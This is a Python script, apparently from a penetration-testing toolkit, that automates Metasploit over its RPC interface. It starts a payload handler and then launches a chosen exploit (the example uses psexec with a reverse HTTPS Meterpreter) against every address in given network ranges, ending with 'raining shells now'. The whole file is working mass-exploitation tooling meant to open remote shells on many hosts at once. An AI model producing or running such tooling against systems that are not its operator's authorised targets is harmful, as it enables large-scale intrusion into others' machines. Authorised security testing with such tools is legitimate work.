#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
# Metasploit mass exploitation utility
#
# Example:
# $ ./multisploit.py -e windows/smb/psexec -p windows/meterpreter/reverse_https \
#   -t 192.168.1.0/24 --handler-opts='LHOST=192.168.1.16,LPORT=443'
#

from argparse import ArgumentParser

from netaddr import iter_nmap_range

from lib.helpers import add_rpc_parser
from lib.msfrpc import rpc_connect


def parse_args():
    parser = ArgumentParser(description='Metasploit mass exploitation utility')
    parser.add_argument(
        '-e', '--exploit',
        help='exploit to run against targets',
        required=True
    )
    parser.add_argument(
        '-p', '--payload',
        help='payload to use with the exploit',
        required=True
    )
    parser.add_argument(
        '-t', '--targets',
        help='comma-separated list of IPs/CIDRs',
        required=True
    )
    parser.add_argument(
        '--handler-opts',
        metavar='OPTIONS',
        help='comma-separated options to pass to the payload handler'
    )
    parser.add_argument(
        '--exploit-opts',
        metavar='OPTIONS',
        help='comma-separated options to pass to the exploit'
    )

    add_rpc_parser(parser)
    return parser.parse_args()


def main():
    args = parse_args()
    rpc = rpc_connect(
        host=args.rpc_host, port=args.rpc_port, ssl=args.rpc_ssl,
        user=args.rpc_user, passwd=args.rpc_passwd
    )
    print("[+] Starting the payload handler")
    if args.handler_opts is None:
        handler_opts = {}
    else:
        handler_opts = dict(opt.split('=') for opt in args.handler_opts.split(','))
    handler_opts.update({
        'PAYLOAD': args.payload,
        'ExitOnSession': False
    })
    resp = rpc.call('module.execute', ['exploit', 'multi/handler', handler_opts])
    print("[-] Started handler for {} (job #{})".format(args.payload, resp['job_id']))
    print("[+] Running {} against {}".format(args.exploit, args.targets))
    if args.exploit_opts is None:
        exploit_opts = {}
    else:
        exploit_opts = dict(opt.split('=') for opt in args.exploit_opts.split(','))
    exploit_opts.update({
        'PAYLOAD': args.payload,
        'DisablePayloadHandler': True
    })
    for target_range in args.targets.split(','):
        for target in iter_nmap_range(target_range):
            exploit_opts['RHOST'] = str(target)
            rpc.call('module.execute', ['exploit', args.exploit, exploit_opts])
            print("[-] Launched exploit against {}".format(target))
    print("[+] Done. It should be raining shells now!")


if __name__ == '__main__':
    main()
